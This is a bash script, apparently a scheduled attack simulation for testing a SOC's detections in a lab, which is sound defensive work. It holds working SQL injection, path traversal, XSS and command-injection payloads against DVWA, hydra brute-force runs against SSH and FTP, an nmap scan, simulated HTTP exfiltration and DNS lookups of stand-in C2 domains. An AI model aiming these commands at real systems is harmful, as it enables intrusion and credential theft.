#!/bin/bash
# SOC Attack Simulation — fires detections across MITRE tactics
# Runs every 30 minutes via cron

DVWA="victim-dvwa"
UBUNTU="victim-ubuntu"
FTP="victim-ftp"
WEBAPI="victim-webapi"

log() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"; }

log "=== Attack simulation start ==="

# ── TA0001 Initial Access — web attacks ──
log "TA0001: SQL injection + path traversal against DVWA"
curl -s -o /dev/null "http://$DVWA/dvwa/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit" \
  -H "Cookie: security=low; PHPSESSID=fakesession" &
curl -s -o /dev/null "http://$DVWA/../../../etc/passwd" &
curl -s -o /dev/null "http://$DVWA/dvwa/vulnerabilities/xss_r/?name=<script>alert(1)</script>" &
wait
log "TA0001: done"

# ── TA0002 Execution — command injection ──
log "TA0002: Command injection attempt"
curl -s -o /dev/null "http://$DVWA/dvwa/vulnerabilities/exec/?ip=127.0.0.1%3Bid%3Bwhoami&Submit=Submit" \
  -H "Cookie: security=low; PHPSESSID=fakesession" &
wait
log "TA0002: done"

# ── TA0006 Credential Access — SSH brute force ──
log "TA0006: SSH brute force against victim-ubuntu"
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 -w 3 \
  ssh://$UBUNTU -e nsr -f 2>/dev/null | head -5 &
HYDRA_PID=$!
sleep 10
kill $HYDRA_PID 2>/dev/null
log "TA0006: done"

# ── TA0007 Discovery — port scan ──
log "TA0007: Port scan"
nmap -sS -p 21,22,80,443,3306,5432 $UBUNTU $DVWA $FTP \
  --max-retries 1 -T3 2>/dev/null | grep -E "open|closed" | head -10 &
wait
log "TA0007: done"

# ── TA0006 Credential Access — FTP brute force ──
log "TA0006: FTP brute force"
hydra -l anonymous -P /usr/share/wordlists/rockyou.txt -t 4 -w 3 \
  ftp://$FTP -f 2>/dev/null | head -5 &
HYDRA_PID=$!
sleep 8
kill $HYDRA_PID 2>/dev/null
log "TA0006: done"

# ── TA0010 Exfiltration — high volume HTTP ──
log "TA0010: Simulated data exfiltration via HTTP"
for i in $(seq 1 20); do
  curl -s -o /dev/null -X POST "http://$WEBAPI/upload" \
    -d "data=$(head -c 1024 /dev/urandom | base64)" 2>/dev/null &
done
wait
log "TA0010: done"

# ── TA0011 C2 — DNS lookups ──
log "TA0011: Suspicious DNS queries"
for domain in malware.example.com c2.badactor.net exfil.attacker.io \
              update.totally-legit.com beacon.malware.cc; do
  nslookup $domain 8.8.8.8 2>/dev/null &
done
wait
log "TA0011: done"

log "=== Attack simulation complete ==="
